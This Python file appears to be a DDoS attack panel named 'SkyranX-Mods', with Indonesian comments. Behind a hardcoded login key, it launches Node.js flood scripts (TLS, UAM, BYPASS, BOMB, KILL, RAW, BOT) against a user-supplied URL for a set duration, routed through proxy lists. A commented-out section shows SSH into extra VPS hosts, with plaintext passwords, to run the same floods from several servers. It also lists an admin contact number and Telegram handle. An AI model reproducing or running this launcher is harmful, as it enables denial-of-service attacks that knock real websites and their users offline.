# -*- coding: utf-8 -*-
from operator import index
from colorama import Fore, Back, Style, init
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
import colorama
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs
import shutil
import time
from pystyle import Colorate, Colors, Center, Col
from colorama import Fore, init
import json
#import paramiko
# hanya visual [👇🏼]
bot1 = """1/5"""#🌚
bot2 = """Permanent"""#🌚
bot = "8"
server = "3"
adm = "true"
# hanya visual [👆🏼]

def methods():
    # Baca data dari file JSON
    with open('assets/methods.json', 'r') as file:
        methods_data = json.load(file)

    print(f"{'Name':<15} | {'Description':<50} | {'sts':<8}")
    print('-' * 80)
    for method in methods_data:
        print(f"{method['name']:<15} | {method['description']:<50} | {method['sts']:<8}")


def error():
    print(Colorate.Vertical(Colors.DynamicMIX((Col.light_blue, Col.cyan)),("""
COMMAND NOT FOUND
- syntax : <method> <url> <port>  <time>
- example : TLS https://example.com 443 120

""")))

def help():
    print(f"""
[ methods ]   | view all methods
[ cls ]       | return to the home menu
[ layer7 ]    | description of methods layer7
[ layer4 ]    | description of methods layer4
[ owner ]     | contact admin
""")

def l7():
    print("""
Layer7 - Tutorial
<methods> <host> <port> <time>
""")

def l4():
    print("""COMING SOON""")
    
def admin():
    print("""
______________________
#Conatack Admin
Wa +6285780637142
Tele @SkyR4n
______________________""")
"""
def run_attack_vps3(url, port, time):
    # Konfigurasi SSH ke VPS ke-3
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Ganti ini dengan informasi VPS ke-3
    vps3_host = '1.1.1.1'
    vps3_port = 22
    vps3_user = 'ccuser'
    vps3_password = 'ch5q-vH54D#S0I'

    try:
        ssh.connect(vps3_host, port=vps3_port, username=vps3_user, password=vps3_password)
        command = f'cd .RAW && screen -dm timeout {time} node RAW.js {url} {time}'
        stdin, stdout, stderr = ssh.exec_command(command)
        #print(f"connect")
        ssh.close()
    except Exception as e:
        print(f"Failed to connect or execute command on serve 3: {str(e)}")

def run_attack_vps2(url, port, time):
    # Konfigurasi SSH ke VPS ke-2
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Ganti ini dengan informasi VPS ke-2
    vps2_host = '1.1.1.1'
    vps2_port = 22
    vps2_user = 'ccuser'
    vps2_password = 'B]Dr6p3q19MM+n'

    try:
        ssh.connect(vps2_host, port=vps2_port, username=vps2_user, password=vps2_password)
        command = f'cd .BOMB && screen -dm timeout {time} node BOMB.js {url} {time} 64 10'
        stdin, stdout, stderr = ssh.exec_command(command)
        print(f"Successful Attack On All Servers")
        ssh.close()
    except Exception as e:
        print(f"Failed to connect or execute command on server: {str(e)}")
"""
def main(username):
	sys.stdout.write(f"""\x1b]2;[\] SkyranX-Mods :: User: [{username}] :: Server: [Offline] :: Expired: [{bot2}] :: Version: [V1]\x07""")
	os.system('cls' if os.name == 'nt' else 'clear')
	print(Colorate.Vertical(Colors.DynamicMIX((Col.light_blue, Col.cyan)), Center.XCenter("""
        ⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⣤⡼⠀⢀⡀⣀⢱⡄⡀⠀⠀⠀⢲⣤⣤⣤⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⡿⠛⠋⠁⣤⣿⣿⣿⣧⣷⠀⠀⠘⠉⠛⢻⣷⣿⣽⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣞⣽⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠠⣿⣿⡟⢻⣿⣿⣇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣟⢦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣿⡾⣿⣿⣿⣿⣿⠿⣻⣿⣿⡀⠀⠀⠀⢻⣿⣷⡀⠻⣧⣿⠆⠀⠀⠀⠀⣿⣿⣿⡻⣿⣿⣿⣿⣿⠿⣽⣦⡀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⠟⣩⣾⣿⣿⣿⢟⣵⣾⣿⣿⣿⣧⠀⠀⠀⠈⠿⣿⣿⣷⣈⠁⠀⠀⠀⠀⣰⣿⣿⣿⣿⣮⣟⢯⣿⣿⣷⣬⡻⣷⡄⠀⠀⠀
⠀⠀⢀⡜⣡⣾⣿⢿⣿⣿⣿⣿⣿⢟⣵⣿⣿⣿⣷⣄⠀⣰⣿⣿⣿⣿⣿⣷⣄⠀⢀⣼⣿⣿⣿⣷⡹⣿⣿⣿⣿⣿⣿⢿⣿⣮⡳⡄⠀⠀
⠀⢠⢟⣿⡿⠋⣠⣾⢿⣿⣿⠟⢃⣾⢟⣿⢿⣿⣿⣿⣾⡿⠟⠻⣿⣻⣿⣏⠻⣿⣾⣿⣿⣿⣿⡛⣿⡌⠻⣿⣿⡿⣿⣦⡙⢿⣿⡝⣆⠀
⠀⢯⣿⠏⣠⠞⠋⠀⣠⡿⠋⢀⣿⠁⢸⡏⣿⠿⣿⣿⠃⢠⣴⣾⣿⣿⣿⡟⠀⠘⢹⣿⠟⣿⣾⣷⠈⣿⡄⠘⢿⣦⠀⠈⠻⣆⠙⣿⣜⠆
⢀⣿⠃⡴⠃⢀⡠⠞⠋⠀⠀⠼⠋⠀⠸⡇⠻⠀⠈⠃⠀⣧⢋⣼⣿⣿⣿⣷⣆⠀⠈⠁⠀⠟⠁⡟⠀⠈⠻⠀⠀⠉⠳⢦⡀⠈⢣⠈⢿⡄
⣸⠇⢠⣷⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠋⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢾⣆⠈⣷
⡟⠀⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⡀⢸⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⢹
⡇⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠈⣿⣼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⢸
⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠶⣶⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼
⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡁⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣼⣀⣠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

""")))
	print(Colorate.Horizontal(Colors.DynamicMIX((Col.light_blue, Col.cyan)), Center.XCenter(""" 
	WELCOME TO SKYRANX-MODS""")))
	print(Colorate.Horizontal(Colors.DynamicMIX((Col.light_blue, Col.cyan)), Center.XCenter("""> Type "help" to start <
	
	
	
""")))
	while True:
		sin = input(f"""SkyranX-Mods ~➤ """)
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			main(username)
		if sinput == "cls" or sinput == "CLS":
			os.system ("clear")
			main(username)
		
		if sinput == "menu" or sinput == "MENU":
		  methods()
		if sinput == "methods" or sinput == "METHODS":
		  methods()
		if sinput == "help" or sinput == "HELP":
		  help()
		if sinput == "LAYER7" or sinput == "layer7":
		  l7()
		if sinput == "LAYER4" or sinput == "layer4":
		  l4()
		if sinput == "owner" or sinput == "OWNER":
		  admin()
#method untuk layer 7 :)

    
		elif sinput == "TLS" or sinput == "tls":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				start_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
				#os.system('clear')
				print(f"""
Attack Details
  Status:  \033[35m[\033[0m\033[32mSuccessfully Send Attack\033[0m\033[35m]\033[0m
  Host:    \033[35m[\033[0m{url}\033[35m]\033[0m
  Port:    \033[35m[\033[0m{port}\033[35m]\033[0m
  Time:    \033[35m[\033[0m{time}\033[35m]\033[0m
  Methods: \033[35m[\033[0m{sinput}\033[35m]\033[0m
  Running: \033[35m[\033[0m{start_time}\033[35m]\033[0m
""")
				os.system(f'cd .BOT && screen -dm timeout {time} node TLS.js {url} {time} 64 10 proxy.txt')
				#run_attack_vps2(url, port, time)
				#run_attack_vps3(url, port, time)
			except ValueError:
				error()
			except IndexError:
				error()
		
				
		elif sinput == "MIX" or sinput == "mix":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				start_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
				#os.system('clear')
				print(f"""
Attack Details
  Status:  \033[35m[\033[0m\033[32mSuccessfully Send Attack\033[0m\033[35m]\033[0m
  Host:    \033[35m[\033[0m{url}\033[35m]\033[0m
  Port:    \033[35m[\033[0m{port}\033[35m]\033[0m
  Time:    \033[35m[\033[0m{time}\033[35m]\033[0m
  Methods: \033[35m[\033[0m{sinput}\033[35m]\033[0m
  Running: \033[35m[\033[0m{start_time}\033[35m]\033[0m
""")
				os.system(f'cd .BOT && screen -dm timeout {time} node MIX.js {url} {time} 64 10')
				#run_attack_vps2(url, port, time)
				#run_attack_vps3(url, port, time)
				
			except ValueError:
				error()
			except IndexError:
				error()
				
		elif sinput == "UAM" or sinput == "uam":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				start_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
				#os.system('clear')
				print(f"""
Attack Details
  Status:  \033[35m[\033[0m\033[32mSuccessfully Send Attack\033[0m\033[35m]\033[0m
  Host:    \033[35m[\033[0m{url}\033[35m]\033[0m
  Port:    \033[35m[\033[0m{port}\033[35m]\033[0m
  Time:    \033[35m[\033[0m{time}\033[35m]\033[0m
  Methods: \033[35m[\033[0m{sinput}\033[35m]\033[0m
  Running: \033[35m[\033[0m{start_time}\033[35m]\033[0m
""")
				os.system(f'cd .BOT && screen -dm timeout {time} node UAM.js {url} {time} 64 10 proxy.txt')
				#run_attack_vps2(url, port, time)
				#run_attack_vps3(url, port, time)
				#os.system ("clear")
			except ValueError:
				error()
			except IndexError:
				error()
				
				
		elif sinput == "BOMB" or sinput == "bomb":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				start_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
				#os.system('clear')
				print(f"""
Attack Details
  Status:  \033[35m[\033[0m\033[32mSuccessfully Send Attack\033[0m\033[35m]\033[0m
  Host:    \033[35m[\033[0m{url}\033[35m]\033[0m
  Port:    \033[35m[\033[0m{port}\033[35m]\033[0m
  Time:    \033[35m[\033[0m{time}\033[35m]\033[0m
  Methods: \033[35m[\033[0m{sinput}\033[35m]\033[0m
  Running: \033[35m[\033[0m{start_time}\033[35m]\033[0m
""")
				os.system(f'cd .BOT && screen -dm timeout {time} node BOMB.js {url} {time} 64 10')
				#run_attack_vps2(url, port, time)
				#run_attack_vps3(url, port, time)
				#os.system ("clear")
			except ValueError:
				error()
			except IndexError:
				error()
				
		elif sinput == "KILL" or sinput == "kill":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				start_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
				#os.system('clear')
				print(f"""
Attack Details
  Status:  \033[35m[\033[0m\033[32mSuccessfully Send Attack\033[0m\033[35m]\033[0m
  Host:    \033[35m[\033[0m{url}\033[35m]\033[0m
  Port:    \033[35m[\033[0m{port}\033[35m]\033[0m
  Time:    \033[35m[\033[0m{time}\033[35m]\033[0m
  Methods: \033[35m[\033[0m{sinput}\033[35m]\033[0m
  Running: \033[35m[\033[0m{start_time}\033[35m]\033[0m
""")
				os.system(f'cd .BOT && screen -dm timeout {time} node KILL.js {url} {time} 64 10')
				#run_attack_vps2(url, port, time)
				#run_attack_vps3(url, port, time)
				#os.system ("clear")
			except ValueError:
				error()
			except IndexError:
				error()
				
		elif sinput == "BYPASS" or sinput == "bypass":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				start_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
				#os.system('clear')
				print(f"""
Attack Details
  Status:  \033[35m[\033[0m\033[32mSuccessfully Send Attack\033[0m\033[35m]\033[0m
  Host:    \033[35m[\033[0m{url}\033[35m]\033[0m
  Port:    \033[35m[\033[0m{port}\033[35m]\033[0m
  Time:    \033[35m[\033[0m{time}\033[35m]\033[0m
  Methods: \033[35m[\033[0m{sinput}\033[35m]\033[0m
  Running: \033[35m[\033[0m{start_time}\033[35m]\033[0m
""")
				os.system(f'cd .BOT && screen -dm timeout {time} node BYPASS.js {url} {time} 64 10 proxy.txt')
				#run_attack_vps2(url, port, time)
				#run_attack_vps3(url, port, time)
				#os.system ("clear")
			except ValueError:
				error()
			except IndexError:
				error()
				
		elif sinput == "RAW" or sinput == "raw":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				start_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
				#os.system('clear')
				print(f"""
Attack Details
  Status:  \033[35m[\033[0m\033[32mSuccessfully Send Attack\033[0m\033[35m]\033[0m
  Host:    \033[35m[\033[0m{url}\033[35m]\033[0m
  Port:    \033[35m[\033[0m{port}\033[35m]\033[0m
  Time:    \033[35m[\033[0m{time}\033[35m]\033[0m
  Methods: \033[35m[\033[0m{sinput}\033[35m]\033[0m
  Running: \033[35m[\033[0m{start_time}\033[35m]\033[0m
""")
				os.system(f'cd .BOT && screen -dm timeout {time} node RAW.js {url} {time}')
				#run_attack_vps2(url, port, time)
				#run_attack_vps3(url, port, time)
				#os.system ("clear")
			except ValueError:
				error()
			except IndexError:
				error()
				
				
		elif sinput == "BOT" or sinput == "bot":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				start_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
				#os.system('clear')
				print(f"""
Attack Details
  Status:  \033[35m[\033[0m\033[32mSuccessfully Send Attack\033[0m\033[35m]\033[0m
  Host:    \033[35m[\033[0m{url}\033[35m]\033[0m
  Port:    \033[35m[\033[0m{port}\033[35m]\033[0m
  Time:    \033[35m[\033[0m{time}\033[35m]\033[0m
  Methods: \033[35m[\033[0m{sinput}\033[35m]\033[0m
  Running: \033[35m[\033[0m{start_time}\033[35m]\033[0m
""")
				os.system(f'cd .BOT && screen -dm timeout {time} node tornado.js GET {url} {time} 10 64 proxy.txt')
				#run_attack_vps2(url, port, time)
				#run_attack_vps3(url, port, time)
				#os.system ("clear")
			except ValueError:
				error()
			except IndexError:
				error()

def login():
	os.system('cls' if os.name == 'nt' else 'clear')
	print(Colorate.Vertical(Colors.DynamicMIX((Col.light_blue, Col.cyan)), Center.XCenter("""
        ⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⣤⡼⠀⢀⡀⣀⢱⡄⡀⠀⠀⠀⢲⣤⣤⣤⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⡿⠛⠋⠁⣤⣿⣿⣿⣧⣷⠀⠀⠘⠉⠛⢻⣷⣿⣽⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣞⣽⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠠⣿⣿⡟⢻⣿⣿⣇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣟⢦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣿⡾⣿⣿⣿⣿⣿⠿⣻⣿⣿⡀⠀⠀⠀⢻⣿⣷⡀⠻⣧⣿⠆⠀⠀⠀⠀⣿⣿⣿⡻⣿⣿⣿⣿⣿⠿⣽⣦⡀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⠟⣩⣾⣿⣿⣿⢟⣵⣾⣿⣿⣿⣧⠀⠀⠀⠈⠿⣿⣿⣷⣈⠁⠀⠀⠀⠀⣰⣿⣿⣿⣿⣮⣟⢯⣿⣿⣷⣬⡻⣷⡄⠀⠀⠀
⠀⠀⢀⡜⣡⣾⣿⢿⣿⣿⣿⣿⣿⢟⣵⣿⣿⣿⣷⣄⠀⣰⣿⣿⣿⣿⣿⣷⣄⠀⢀⣼⣿⣿⣿⣷⡹⣿⣿⣿⣿⣿⣿⢿⣿⣮⡳⡄⠀⠀
⠀⢠⢟⣿⡿⠋⣠⣾⢿⣿⣿⠟⢃⣾⢟⣿⢿⣿⣿⣿⣾⡿⠟⠻⣿⣻⣿⣏⠻⣿⣾⣿⣿⣿⣿⡛⣿⡌⠻⣿⣿⡿⣿⣦⡙⢿⣿⡝⣆⠀
⠀⢯⣿⠏⣠⠞⠋⠀⣠⡿⠋⢀⣿⠁⢸⡏⣿⠿⣿⣿⠃⢠⣴⣾⣿⣿⣿⡟⠀⠘⢹⣿⠟⣿⣾⣷⠈⣿⡄⠘⢿⣦⠀⠈⠻⣆⠙⣿⣜⠆
⢀⣿⠃⡴⠃⢀⡠⠞⠋⠀⠀⠼⠋⠀⠸⡇⠻⠀⠈⠃⠀⣧⢋⣼⣿⣿⣿⣷⣆⠀⠈⠁⠀⠟⠁⡟⠀⠈⠻⠀⠀⠉⠳⢦⡀⠈⢣⠈⢿⡄
⣸⠇⢠⣷⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠋⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢾⣆⠈⣷
⡟⠀⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⡀⢸⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⢹
⡇⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠈⣿⣼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⢸
⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠶⣶⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼
⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡁⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣼⣀⣠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
""")))

	user = "skyran"
	username = input(Colorate.Horizontal(Colors.DynamicMIX((Col.light_blue, Col.cyan)),"""
ApiKey ~➤ """))
	if username != user:
		print("[ ? ] input Key error")
		sys.exit(1)
	elif username == user:
		print("[ ? ] input Key success")
		time.sleep(1)
		main(username)
if __name__ == "__main__":
    login()
